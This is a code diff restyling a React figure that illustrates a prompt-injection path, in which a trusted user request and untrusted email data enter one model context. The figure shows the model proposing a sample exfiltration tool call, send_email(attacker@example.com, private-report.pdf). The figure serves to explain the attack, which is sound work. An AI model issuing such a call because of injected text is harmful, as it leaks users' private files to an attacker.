@@ -13,7 +13,7 @@ export default function PromptInjectionPathFigure() {
     <div className="space-y-5 font-mono">
       <div className="grid gap-4 md:grid-cols-2">
         <motion.div style={{ opacity: sources }} className="rounded-lg border border-accent/30 bg-accent/5 p-5">
-          <div className="mb-4 flex items-center justify-between gap-4 text-[10px] uppercase tracking-[0.16em] text-accent">
+          <div className="mb-4 flex items-center justify-between gap-4 text-tick uppercase tracking-[0.16em] text-accent">
             <span>trusted request</span>
             <span>user</span>
           </div>
@@ -21,7 +21,7 @@ export default function PromptInjectionPathFigure() {
         </motion.div>
 
         <motion.div style={{ opacity: sources }} className="rounded-lg border border-amber/30 bg-amber/5 p-5">
-          <div className="mb-4 flex items-center justify-between gap-4 text-[10px] uppercase tracking-[0.16em] text-amber">
+          <div className="mb-4 flex items-center justify-between gap-4 text-tick uppercase tracking-[0.16em] text-amber">
             <span>untrusted data</span>
             <span>email</span>
           </div>
@@ -34,7 +34,7 @@ export default function PromptInjectionPathFigure() {
         </motion.div>
       </div>
 
-      <motion.div style={{ opacity: context }} className="flex items-center gap-4 py-1 text-[10px] uppercase tracking-[0.14em] text-muted">
+      <motion.div style={{ opacity: context }} className="flex items-center gap-4 py-1 text-tick uppercase tracking-[0.14em] text-muted">
         <span className="h-px flex-1 bg-border" />
         <span>both enter one model context</span>
         <span className="h-px flex-1 bg-border" />
@@ -42,14 +42,14 @@ export default function PromptInjectionPathFigure() {
 
       <motion.div style={{ opacity: action }} className="grid gap-4 md:grid-cols-[0.75fr_auto_1.25fr] md:items-center">
         <div className="rounded-lg border border-border bg-surface/50 p-5 text-center">
-          <div className="text-[10px] uppercase tracking-[0.16em] text-muted">model</div>
+          <div className="text-tick uppercase tracking-[0.16em] text-muted">model</div>
           <div className="mt-2 text-sm text-heading">proposes the next action</div>
         </div>
-        <div className="hidden text-xl text-muted md:block">→</div>
-        <div className="rounded-lg border border-[#c96a5c]/35 bg-[#c96a5c]/5 p-5">
-          <div className="text-[10px] uppercase tracking-[0.16em] text-[#dc796b]">proposed tool call</div>
-          <div className="mt-3 break-words text-xs leading-relaxed text-heading sm:text-sm">
-            send_email(<span className="text-[#dc796b]">attacker@example.com</span>, private-report.pdf)
+        <div className="hidden text-lead text-muted md:block">→</div>
+        <div className="rounded-lg border border-amber/35 bg-amber/5 p-5">
+          <div className="text-tick uppercase tracking-[0.16em] text-amber">proposed tool call</div>
+          <div className="mt-3 break-words text-meta leading-relaxed text-heading sm:text-sm">
+            send_email(<span className="text-amber">attacker@example.com</span>, private-report.pdf)
           </div>
         </div>
       </motion.div>
